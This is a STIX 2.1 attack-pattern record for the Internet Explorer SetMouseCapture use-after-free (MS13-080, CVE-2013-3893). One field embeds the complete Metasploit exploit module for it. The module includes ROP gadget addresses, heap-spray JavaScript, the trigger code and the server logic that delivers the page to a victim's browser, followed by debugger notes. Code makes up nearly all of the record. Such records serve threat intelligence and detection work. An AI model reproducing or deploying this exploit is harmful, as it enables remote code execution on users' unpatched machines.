{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e400f75c-bfd4-4dc5-8e1a-a14c206c6a8d",
    "created": "2024-08-14T16:43:29.178491Z",
    "modified": "2024-08-14T16:43:29.178496Z",
    "name": "\"MS13-080 Microsoft Internet Explorer SetMouseCapture Use-After-Free\"",
    "description": " This module exploits a use-after-free vulnerability that currents targets Internet Explorer 9 on Windows 7, but the flaw should exist in versions 6/7/8/9/10/11. It was initially found in the wild in Japan, but other regions such as English Chinese, Korean, etc, were targeted as well.  The vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a reference during an event. An attacker first can setup two elements, where the second is the child of the first, and then setup a onlosecapture event handler for the parent element. The onlosecapture event seems to require two setCapture() calls to trigger one for the parent element, one for the child. When the setCapture() call for the child element is called, it finally triggers the event, which allows the attacker to cause an arbitrary memory release using document.write(), which in particular frees up a 0x54-byte memory.  The exact size of this memory may differ based on the version of IE. After the free, an invalid reference will still be kept and pass on to more functions, eventuall this arrives in function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary code execution) when this function attempts to use this reference to call what appears to be a PrivateQueryInterface due to the offset (0x00).  To mimic the same exploit found in the wild, this module will try to use the same DLL from Microsoft Office 2007 or 2010 to leverage the attack.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ie_setmousecapture_uaf.rb",
            "external_id": "ie_setmousecapture_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3893"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/security/advisory/2887505"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/srd/archive/2013/09/17/cve-2013-3893-fix-it-workaround-available.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/09/30/metasploit-releases-cve-2013-3893-ie-setmousecapture-use-after-free"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-080 Microsoft Internet Explorer SetMouseCapture Use-After-Free\",\n      'Description'    => %q{\n          This module exploits a use-after-free vulnerability that currents targets Internet\n          Explorer 9 on Windows 7, but the flaw should exist in versions 6/7/8/9/10/11.\n          It was initially found in the wild in Japan, but other regions such as English,\n          Chinese, Korean, etc, were targeted as well.\n\n          The vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a\n          reference during an event. An attacker first can setup two elements, where the second\n          is the child of the first, and then setup a onlosecapture event handler for the parent\n          element. The onlosecapture event seems to require two setCapture() calls to trigger,\n          one for the parent element, one for the child. When the setCapture() call for the child\n          element is called, it finally triggers the event, which allows the attacker to cause an\n          arbitrary memory release using document.write(), which in particular frees up a 0x54-byte\n          memory.  The exact size of this memory may differ based on the version of IE. After the\n          free, an invalid reference will still be kept and pass on to more functions, eventuall\n          this arrives in function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary\n          code execution) when this function attempts to use this reference to call what appears to\n          be a PrivateQueryInterface due to the offset (0x00).\n\n          To mimic the same exploit found in the wild, this module will try to use the same DLL\n          from Microsoft Office 2007 or 2010 to leverage the attack.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',      # Exploit in the wild first spotted in Japan\n          'sinn3r',       # Metasploit (thx binjo for the heads up!)\n          'Rich Lundeen'  # IE8 windows xp\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3893' ],\n          [ 'OSVDB', '97380' ],\n          [ 'MSB', 'MS13-080' ],\n          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2887505' ],\n          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2013/09/17/cve-2013-3893-fix-it-workaround-available.aspx' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/09/30/metasploit-releases-cve-2013-3893-ie-setmousecapture-use-after-free' ]\n        ],\n      'Platform'       => 'win',\n      'BrowserRequirements' =>\n        {\n          :ua_name => HttpClients::IE,\n          :source  => /script/i\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'Windows 7 with Office 2007|2010',\n            {\n              :os_name   => 'Windows 7',\n              :ua_ver    => \"9.0\",\n              :office    => /2007|2010/\n            }\n          ],\n          [\n            'Windows XP with IE 8',\n            {\n              :os_name   => 'Windows XP',\n              :ua_ver    => \"8.0\"\n            }\n          ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'PrependEncoder'  => \"\\x81\\xc4\\x80\\xc7\\xfe\\xff\" # add esp, -80000\n        },\n      'DefaultOptions'  =>\n        {\n          'PrependMigrate'       => true,\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-09-17',\n      'DefaultTarget'  => 0))\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"V\")[0].to_i\n  end\n\n  def get_payload(target_info)\n    code = payload.encoded\n    rop  = ''\n    alignment = ''\n\n    case target_info[:office]\n    when '2007'\n      alignment =\n      [\n        junk,        # Alignment\n      ].pack(\"V*\")\n\n      rop = generate_rop_payload('hxds', code, { 'target'=>'2007' })\n\n    when '2010'\n      alignment =\n      [\n        # 4 dword junks due to the add esp in stack pivot\n        junk,\n        junk,\n        junk,\n        junk,\n        0x51bf518b, # ret\n        junk # due to the ret 4 on the stack pivot\n      ].pack(\"V*\")\n\n      rop = generate_rop_payload('hxds', code, { 'target'=>'2010' })\n    end\n\n    p = alignment + rop + code\n    p\n  end\n\n  def get_exploit_html_ie9(cli, target_info)\n    gadgets = {}\n    case target_info[:office]\n    when '2007'\n      gadgets[:spray1] = 0x1af40020\n\n      # 0x31610020-0xc4, pointer to gadgets[:call_eax]\n      gadgets[:target] = 0x3160ff5c\n\n      # mov eax, [esi]\n      # push esi\n      # call [eax+4]\n      gadgets[:call_eax] = 0x51bd1ce8\n\n      # xchg eax,esp\n      # add byte [eax], al\n      # pop esi\n      # mov [edi+23c], ebp\n      # mov [edi+238], ebp\n      # mov [edi+234], ebp\n      # pop ebp\n      # pop ebx\n      # ret\n      gadgets[:pivot] = 0x51be4418\n\n    when '2010'\n      gadgets[:spray1] = 0x1a7f0020\n\n      # 0x30200020-0xc4, pointer to gadgets[:call_eax]\n      gadgets[:target] = 0x301fff5c\n\n      # mov eax, [esi]\n      # push esi\n      # call [eax+4]\n      gadgets[:call_eax] = 0x51bd1a41\n\n      # xchg eax,esp\n      # add eax,dword ptr [eax]\n      # add esp,10\n      # mov eax,esi\n      # pop esi\n      # pop ebp # retn 4\n      gadgets[:pivot] = 0x51c00e64\n    end\n\n    p1 =\n    [\n      gadgets[:target],  # Target address\n      gadgets[:pivot]    # stack pivot\n    ].pack(\"V*\")\n\n    p1 << get_payload(target_info)\n\n    # MSHTML!CTreeNode::NodeAddRef+0x48 (call eax)\n    p2 = [ gadgets[:call_eax] ].pack(\"V*\")\n\n    js_s1 = Rex::Text::to_unescape([gadgets[:spray1]].pack(\"V*\"))\n    js_p1 = Rex::Text.to_unescape(p1)\n    js_p2 = Rex::Text.to_unescape(p2)\n\n    %Q|\n<html>\n<script>\n#{js_property_spray}\n\nfunction loadOffice() {\n  try{location.href='ms-help://'} catch(e){}\n}\n\nvar a = new Array();\nfunction spray() {\n  var obj = '';\n  for (i=0; i<20; i++) {\n    if (i==0) { obj += unescape(\"#{js_s1}\"); }\n    else      { obj += \"\\\\u4242\\\\u4242\"; }\n  }\n  obj += \"\\\\u5555\";\n\n  for (i=0; i<10; i++) {\n    var e = document.createElement(\"div\");\n    e.className = obj;\n    a.push(e);\n  }\n\n  var s1 = unescape(\"#{js_p1}\");\n  sprayHeap({shellcode:s1, maxAllocs:0x300});\n  var s2 = unescape(\"#{js_p2}\");\n  sprayHeap({shellcode:s2, maxAllocs:0x300});\n}\n\nfunction hit()\n{\n  var id_0 = document.createElement(\"sup\");\n  var id_1 = document.createElement(\"audio\");\n\n  document.body.appendChild(id_0);\n  document.body.appendChild(id_1);\n  id_1.applyElement(id_0);\n\n  id_0.onlosecapture=function(e) {\n    document.write(\"\");\n    spray();\n  }\n\n  id_0['outerText']=\"\";\n  id_0.setCapture();\n  id_1.setCapture();\n}\n\nfor (i=0; i<20; i++) {\n  document.createElement(\"frame\");\n}\n\nwindow.onload = function() {\n  loadOffice();\n  hit();\n}\n</script>\n</html>\n    |\n  end\n\n  def get_exploit_html_ie8(cli, target_info)\n    code = payload.encoded\n\n    #address containing our heap spray is 0x20302020\n    spray_addr = \"\\\\u2024\\\\u2030\"\n\n    #size to fill after free is 0x50\n    free_fill = spray_addr + \"\\\\u2424\" * (((0x50-1)/2)-2)\n\n    rop = [\n      0x77c3868a,   # stack pivot in msvcrt || xchg eax, esp ; rcr dword [ebx-0x75], 0xFFFFFFC1 ; pop ebp ; ret  ;\n      0x20302020    # pointer to stack pivot\n    ].pack(\"V*\")\n\n    rop << generate_rop_payload('msvcrt', code, { 'target'=>'WINDOWS XP SP3' }) << code\n\n    js_rop = Rex::Text.to_unescape(rop)\n\n    %Q|\n<html>\n<script>\n\n#{js_property_spray}\n\ntt = new Array(30);\n\nfunction trigger()\n{\n  var id_0 = document.createElement(\"sup\");\n  var id_1 = document.createElement(\"audio\");\n\n  document.body.appendChild(id_0);\n  document.body.appendChild(id_1);\n  id_1.applyElement(id_0);\n\n  id_0.onlosecapture=function(e) {\n    document.write(\"\");\n\n    for(i = 0; i < tt.length; i++) {\n      tt[i] = document.createElement('div');\n      tt[i].className =\"#{free_fill}\";\n    }\n\n  var s = unescape(\"#{js_rop}\");\n  sprayHeap({shellcode:s});\n  }\n\n  id_0['outerText']=\"\";\n  id_0.setCapture();\n  id_1.setCapture();\n}\n\nwindow.onload = function() {\n  trigger();\n}\n</script>\n    |\n\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    case target_info[:ua_ver]\n    when \"8.0\"\n      html = get_exploit_html_ie8(cli, target_info)\n    when \"9.0\"\n      html = get_exploit_html_ie9(cli, target_info)\n    end\n    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})\n\n  end\nend\n\n=begin\n\nhxds.dll (Microsoft\u00ae Help Data Services Module)\n\n  2007 DLL info:\n  ProductVersion:   2.05.50727.198\n  FileVersion:      2.05.50727.198 (QFE.050727-1900)\n\n  2010 DLL info:\n  ProductVersion:   2.05.50727.4039\n  FileVersion:      2.05.50727.4039 (QFE.050727-4000)\n\nmshtml.dll\n\n  WinXP IE8 DLL info:\n  ProductVersion:   8.0.6001.18702\n  FileVersion:      8.0.6001.18702\n  FileDescription:  Microsoft (R) HTML Viewer\n\n  Win7 IE9 DLL info:\n  ProductVersion:   9.00.8112.16446\n  FileVersion:      9.00.8112.16446 (WIN7_IE9_GDR.120517-1400)\n  FileDescription:  Microsoft (R) HTML Viewer\n\n\n0:005> r\neax=41414141 ebx=6799799c ecx=679b6a14 edx=00000000 esi=00650d90 edi=021fcb34\neip=679b6b61 esp=021fcb0c ebp=021fcb20 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nMSHTML!CTreeNode::GetInterface+0xd8:\n679b6b61 8b08            mov     ecx,dword ptr [eax]  ds:0023:41414141=????????\n\n\n66e13df7 8b0e            mov     ecx,dword ptr [esi]\n66e13df9 8b11            mov     edx,dword ptr [ecx]  <-- mshtml + (63993df9 - 63580000)\n66e13dfb 8b82c4000000    mov     eax,dword ptr [edx+0C4h]\n66e13e01 ffd0            call    eax\n\n=end\n",
    "x_mitre_disclosure_date": "2013-09-17",
    "x_mitre_platforms": [
        "win'"
    ]
}